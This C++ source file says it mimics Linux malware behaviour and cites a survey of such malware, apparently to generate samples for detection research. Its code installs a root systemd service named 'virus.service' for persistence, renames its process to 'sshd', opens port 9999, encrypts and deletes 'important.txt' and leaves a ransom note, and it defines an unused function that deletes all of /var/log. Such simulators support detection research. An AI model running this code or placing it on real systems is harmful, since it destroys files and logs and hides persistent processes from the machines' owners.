#include <iostream>
#include <unistd.h>
#include <fstream>
#include <ctime>
#include <random>
#include <chrono>
#include <thread>
#include <filesystem>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/prctl.h>

int createService();
int changeProcName();
int openPort();
void ransomFile();
void writeNote(int encKey);
void clearLogs();
int genKey();
void readFile();
void writeFile();
void deleteFile();
void wait(int time);
void math();

/* 
This program is designed to perform a simple sequence of actions meant to mimic malicious program behavior.
Based on survey of Linux malware behavior from Cozzi et. al.
*/

// establishes persistance by creating a service script
int createService(){
   std::filesystem::path currentPath = std::filesystem::current_path();

   std::ofstream serviceFile("/etc/systemd/system/virus.service");
   std::string partOne = "[Unit]\nDescription=Malicious Virus\nAfter=network.target\n\n[Service]\nExecStart=";
   std::string partTwo = "/virus\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target\n";
   // write out ransom text
   serviceFile << partOne << currentPath.string() << partTwo;
   serviceFile.close();

   const char *serviceCommand = "systemctl enable virus.service && systemctl start virus.service"; // running as root, no need for sudo

   int exitCode = system(serviceCommand);

   if (exitCode == 0) {
      printf("[+] Service enabled and started successfully.\n");
      return exitCode;
   } else {
      printf("[!] Error enabling or starting the service.\n");
      return exitCode;
   }
}

// deception tactic, invoke prctl to change process name in memory to 'sshd'
int changeProcName() {
   char procName[] = "sshd";
   int exitCode = prctl(PR_SET_NAME, &procName);
   if (exitCode == 0) {
      printf("[+] Changed process name to sshd successfully\n");
      return exitCode;
   } else {
      printf("[!] Error changing process name\n");
      return exitCode;
   }
}

// opens a port on the system
int openPort(){
   // open port
   int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
   if (serverSocket == -1) {
      printf("[!] Error creating socket\n");
   }
   else {
      printf("[+] Socket created\n");
   }

   // Bind the socket to an address and port
   struct sockaddr_in serverAddress;
   serverAddress.sin_family = AF_INET;
   serverAddress.sin_addr.s_addr = INADDR_ANY;
   serverAddress.sin_port = htons(9999); // Port number

   int exitCode = bind(serverSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress));

   if (exitCode != 0) {
      printf("[!] Error binding socket\n");
      close(serverSocket);
      return exitCode;
   } else {
      printf("[+] Successfully opened socket 9999\n");
      return exitCode;
   }
   close(serverSocket);

}

// create an encryption key, set up stream cipher, create new file and write encrypted data, delete original
// looks for the file "important.txt" in the current dir.
void ransomFiles(){

   printf("[+] Opening important file..\n");
   // read in important.txt file
   std::ifstream input("important.txt", std::ios::binary);
   if (!input) {
      printf("[!] Failed to open the important file.\n");
      exit(1);
   }

   // create empty file and write out encrypted data using simple xor encryption
   std::ofstream output("enc.txt", std::ios::binary);
   if (!output){
      printf("[!] Failed to open output file.\n");
      exit(1);
   }

   char byte;
   int encKey = genKey();

   printf("[+] Encrypting important file to enc.txt..\n");
   while (input.get(byte)) {
      char encByte = byte ^ encKey; // XOR each byte from original file with enc keyy
      output.put(encByte);
   }
   
   input.close();
   output.close();

   // delete important .txt
   printf("[+] Deleting important file..\n");
   std::filesystem::remove("important.txt");
   writeNote(encKey);
}

// write out 'ransom' note which includes encryption key
void writeNote(int encKey){
   // create file ransom.txt
   printf("[+] Creating ransom note..\n");
   std::ofstream ransomFile("ransom.txt");
   // write out ransom text
   ransomFile << "The file \'important.txt\' has been encrypted with a key of " << encKey << std::endl;

   ransomFile.close();
   printf("[+] Ransom note created\n");
}


// deletes logging
void clearLogs() {
   // make system call to rm -rf var/log files.
   printf("[+] Attempting to clear logs..\n");
   std::filesystem::remove_all("/var/log");
   printf("[+] Logs successfully cleared\n");
}

int genKey() {
   printf("[+] Generating encryption key..\n");
   std::mt19937 rng(std::time(nullptr)); // Initialize random number generator with current time as seed
   std::uniform_int_distribution<unsigned int> distribution(0, 127); // Range of possible byte character values
   unsigned int randomByte = distribution(rng);
   printf("[+] Encryption key generated\n");
   return randomByte;
}

// open a file and copy the contents
void readFile() {
   printf("[+] Attempting to read important.txt..\n");
   std::ifstream input("important.txt");
   if (!input) {
      printf("[!] Failed to open the important file.\n");
      exit(1);
   } else {
      printf("[+] Successfully opened important file\n");
   }
   input.close();
}

void writeFile() {
   printf("[+] Attempting to write to random.txt..\n");
   std::ofstream output("random.txt");
   if (!output) {
      printf("[!] Failed to open the random file\n");
      exit(1);
   } else {
      output << "This is some random text that the program has written to a file" << std::endl;
      printf("[+] Successfully wrote to random file.\n");

   }
   
   output.close();
}

void deleteFile() {
   printf("[+] Attempting to delete random.txt..\n");
   std::filesystem::remove("random.txt");
   printf("[+] random.txt deleted\n");
}

// function to wait for a predefined amount of time
void wait(int time){
   printf("[+] Waiting..\n");
   std::this_thread::sleep_for(std::chrono::seconds(time));
   printf("[+] Wait over\n");
}


// perform random mathmatical operations
void math(){
   printf("[+] Entering junk function..\n");
   // generate two random, nonzero numbers
   int a = rand();
   int b = rand();

   int choice = (rand() % 5) + 1;

   // randomly choose one of five operations
   switch (choice)
   {
   case 1: // addition
      a + b;
      break;
   case 2: // subtraction
      a - b;
      break;
   case 3: // multiplication
      a * b;
      break;
   case 4: // division
      if (b != 0){
         a / b;
      }
      break;
   case 5: // modulous
      if (b != 0){
         a % b;
      }
      break;
   default:
      break;
   }
   printf("[+] Junk operations completed\n");
} 

// main function added by generator

int main(int argc, char **argv){
	createService();
	wait(5);
	math();
	wait(5);
	math();
	wait(5);
	math();
	math();
	wait(5);
	changeProcName();
	math();
	math();
	wait(5);
	math();
	wait(5);
	math();
	wait(5);
	wait(5);
	openPort();
	math();
	math();
	math();
	wait(5);
	wait(5);
	wait(5);
	wait(5);
	math();
	ransomFiles();
	math();
	math();
	wait(5);
	wait(5);
	wait(5);
	math();
	math();
	wait(5);
}